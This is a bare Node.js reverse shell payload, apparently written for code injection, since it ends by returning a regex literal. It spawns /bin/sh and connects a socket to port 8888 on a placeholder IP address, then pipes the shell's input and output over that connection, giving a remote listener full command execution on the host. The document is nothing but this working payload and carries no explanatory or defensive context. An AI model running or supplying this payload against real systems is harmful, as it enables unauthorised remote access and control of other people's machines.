(function(){
	var net = require("net"),
		cp = require("child_process"),
		sh = cp.spawn("/bin/sh",[]);
	var client = new net.Socket();
	client.connect(8888,"xxx.xxx.xxx.xxx",function(){
		client.pipe(sh.stdin);
		sh.stdout.pipe(client);
		sh.stderr.pipe(client);
	});
	return /a/;
})();